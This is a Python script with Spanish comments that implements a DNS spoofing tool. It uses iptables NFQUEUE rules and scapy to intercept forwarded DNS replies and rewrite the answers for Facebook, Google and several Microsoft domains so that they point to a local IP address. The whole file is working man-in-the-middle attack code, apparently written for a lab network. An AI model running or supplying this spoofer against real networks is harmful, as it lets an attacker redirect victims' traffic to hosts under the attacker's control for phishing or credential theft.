from scapy.all import IP, UDP, DNS, DNSQR, DNSRR
from netfilterqueue import NetfilterQueue
import os

class DNSSpoofer:
    """
    Clase para realizar DNS Spoofing utilizando iptables y NetfilterQueue.

    Atributos:
        targets (dict): Diccionario con dominios (str) y sus direcciones IP falsas.
        queue_num (int): Número de la cola de NetfilterQueue.
        queue (NetfilterQueue): Instancia de NetfilterQueue.
    """

    def __init__(self, targets=None, queue_num=0):
        """
        Inicializa la clase DNSSpoofer con los objetivos y el número de cola.

        Args:
            targets (dict): Diccionario con dominios y sus direcciones IP falsas.
            queue_num (int): Número de la cola de NetfilterQueue.

        Raises:
            ValueError: Si los targets no se proporcionan o no son un diccionario.
        """
        if not targets or not isinstance(targets, dict):
            raise ValueError(
                "Los targets deben ser un diccionario de la forma "
                '{"facebook.com": "192.168.64.8", "www.facebook.com": "192.168.64.8"}'
            )

        # Normalizamos las claves a minúsculas y sin punto final
        self.targets = {
            domain.rstrip(".").lower(): ip
            for domain, ip in targets.items()
        }

        self.queue_num = queue_num

        # Ojo: esto solo intercepta tráfico en FORWARD (equipo actuando como router)
        # Lo ideal es limitarlo a DNS:
        # iptables -I FORWARD -p udp --dport 53 -j NFQUEUE --queue-num 0
        os.system(f"iptables -I FORWARD -p udp --dport 53 -j NFQUEUE --queue-num {self.queue_num}")
        os.system(f"iptables -I FORWARD -p udp --sport 53 -j NFQUEUE --queue-num {self.queue_num}")

        self.queue = NetfilterQueue()

    def process_packet(self, packet):
        """
        Procesa cada paquete capturado por la cola de NetfilterQueue.

        Si el paquete contiene una respuesta DNS para uno de los dominios
        objetivos, se modifica la respuesta.
        """
        scapy_packet = IP(packet.get_payload())

        # Solo nos interesan paquetes UDP con capa DNS
        if scapy_packet.haslayer(DNS) and scapy_packet.haslayer(DNSQR):
            qname_bytes = scapy_packet[DNSQR].qname
            qname = qname_bytes.decode().rstrip(".").lower()

            print(f"[DEBUG] Consulta DNS detectada: {qname}")

            if scapy_packet.haslayer(DNSRR) and qname in self.targets:
                spoof_ip = self.targets[qname]
                original_summary = scapy_packet.summary()
                scapy_packet = self.modify_packet(scapy_packet, spoof_ip)
                modified_summary = scapy_packet.summary()
                print(f"[Modificado]: {original_summary} -> {modified_summary}")
                packet.set_payload(bytes(scapy_packet))

        packet.accept()

    def modify_packet(self, packet, spoof_ip):
        """
        Modifica el paquete DNS para falsificar la respuesta.

        Args:
            packet (scapy.Packet): Paquete a modificar.
            spoof_ip (str): IP falsa que se va a inyectar en la respuesta.

        Returns:
            scapy.Packet: Paquete modificado con la respuesta DNS falsificada.
        """
        qname = packet[DNSQR].qname

        # Creamos una respuesta DNS falsa
        answer = DNSRR(rrname=qname, rdata=spoof_ip)

        # Reemplazamos la sección de respuesta
        packet[DNS].an = answer
        packet[DNS].ancount = 1

        # Recalcular longitudes y checksums
        if packet.haslayer(IP):
            del packet[IP].len
            del packet[IP].chksum
        if packet.haslayer(UDP):
            del packet[UDP].len
            del packet[UDP].chksum

        return packet

    def run(self):
        """
        Inicia el proceso de DNS Spoofing y enlaza la cola de NetfilterQueue.

        Captura interrupciones del teclado para limpiar las reglas de iptables antes
        de salir.
        """
        try:
            print("Inicializando DNS Spoofer...")
            print("Dominios que se van a interceptar:")
            for domain, ip in self.targets.items():
                print(f" - {domain} -> {ip}")

            self.queue.bind(self.queue_num, self.process_packet)
            self.queue.run()
        except KeyboardInterrupt:
            print("Deteniendo el proceso de captura y limpiando el entorno...")
            os.system("iptables -D FORWARD -p udp --dport 53 -j NFQUEUE --queue-num {0}".format(self.queue_num))
            os.system("iptables -D FORWARD -p udp --sport 53 -j NFQUEUE --queue-num {0}".format(self.queue_num))
            # Si quieres limpiarlo todo:
            # os.system("iptables --flush")


if __name__ == "__main__":
    targets = {
        "facebook.com": "192.168.64.8",
        "www.facebook.com": "192.168.64.8",
        "google.com": "192.168.64.8",
        "www.google.com": "192.168.64.8",
        "edge.microsoft.com": "192.168.64.8",
        "config.edge.skype.com": "192.168.64.8",
        "config.edge.skype.com": "192.168.64.8",
        "beacons.gcp.gvt2.com": "192.168.64.8",
        "msedge.b.tlu.dl.delivery.mp.microsoft.com": "192.168.64.8",
        "assets.msn.com": "192.168.64.8"
    }

    dnsspoofer = DNSSpoofer(targets=targets, queue_num=0)
    dnsspoofer.run()